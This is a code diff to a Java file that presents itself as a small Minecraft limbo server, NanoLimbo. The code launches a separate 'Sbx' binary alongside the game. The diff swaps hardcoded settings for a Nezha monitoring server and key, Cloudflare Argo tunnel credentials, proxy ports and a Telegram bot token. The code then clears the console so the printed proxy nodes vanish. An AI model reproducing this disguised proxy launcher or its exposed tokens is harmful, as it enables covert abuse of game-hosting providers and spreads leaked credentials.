@@ -22,6 +22,7 @@ import java.net.*;
 import java.nio.file.*;
 import java.util.*;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.lang.reflect.Field;
 
 import ua.nanit.limbo.server.LimboServer;
 import ua.nanit.limbo.server.Log;
@@ -38,8 +39,9 @@ public final class NanoLimbo {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
         "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
         "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME"
+        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
     };
+    
     
     public static void main(String[] args) {
         
@@ -56,28 +58,16 @@ public final class NanoLimbo {
         // Start SbxService
         try {
             runSbxBinary();
-
-            // ✅ 启动续期脚本 renew.sh（服务器运行期间自动续期）
-            File renewScript = new File("renew.sh");
-            if (renewScript.exists()) {
-                new ProcessBuilder("bash", "renew.sh")
-                    .inheritIO()
-                    .start();
-                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
-            } else {
-                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
-            }
             
-            // 注册关闭钩子（停止服务）
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
                 stopServices();
             }));
 
-            // 等待 20 秒后继续
+            // Wait 20 seconds before continuing
             Thread.sleep(15000);
             System.out.println(ANSI_GREEN + "Server is running!\n" + ANSI_RESET);
-            System.out.println(ANSI_GREEN + "Thank you for using this script, Enjoy!\n" + ANSI_RESET);
+            System.out.println(ANSI_GREEN + "Thank you for using this script,Enjoy!\n" + ANSI_RESET);
             System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds, you can copy the above nodes" + ANSI_RESET);
             Thread.sleep(15000);
             clearConsole();
@@ -85,7 +75,7 @@ public final class NanoLimbo {
             System.err.println(ANSI_RED + "Error initializing SbxService: " + e.getMessage() + ANSI_RESET);
         }
         
-        // 启动游戏核心（LimboServer）
+        // start game
         try {
             new LimboServer().start();
         } catch (Exception e) {
@@ -132,23 +122,23 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "1cd4db96-f910-4a2b-8271-7a1458f09504");
+        envVars.put("UUID", "a3e1fb4c-d067-454f-aa17-403faa8f7e88");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
         envVars.put("NEZHA_PORT", "");
         envVars.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
-        envVars.put("ARGO_PORT", "9010");
-        envVars.put("ARGO_DOMAIN", "freezehost-fr.tunnelpro.netlib.re");
-        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiODM5NTNmZWQtMmNjMC00ZGYxLWE5MDAtOWY3ZWJkNmRmMWI5IiwicyI6Ik0yRTVaR0UwTTJFdE9EUTRaUzAwWm1FNExUa3hOV1V0TjJVeU9UTTRZek14WmpnNSJ9");
-        envVars.put("HY2_PORT", "11450");
+        envVars.put("ARGO_PORT", "");
+        envVars.put("ARGO_DOMAIN", "firecone-de.milan.us.kg");
+        envVars.put("ARGO_AUTH", "eyJhIjoiNGMyMGE2ZTY0MmM4YWZhNzMzZDRlYzY0N2I0OWRlZTQiLCJ0IjoiZWM1NzJmNzgtMzMwMS00YWI0LTk2ZjEtNzRjYjEyNjViM2Q1IiwicyI6IlpXTXdORE14TWpndFpHRTVPQzAwTjJRM0xXRmhNMlV0WWpjM01HWmlOalEwT0dReSJ9");
+        envVars.put("HY2_PORT", "1398");
         envVars.put("TUIC_PORT", "");
-        envVars.put("REALITY_PORT", "11450");
+        envVars.put("REALITY_PORT", "1398");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "6839843424");
         envVars.put("BOT_TOKEN", "7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "FreezeHost-FR");
+        envVars.put("NAME", "Firecone-DE");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
@@ -206,7 +196,7 @@ public final class NanoLimbo {
         }
         return path;
     }
-
+    
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
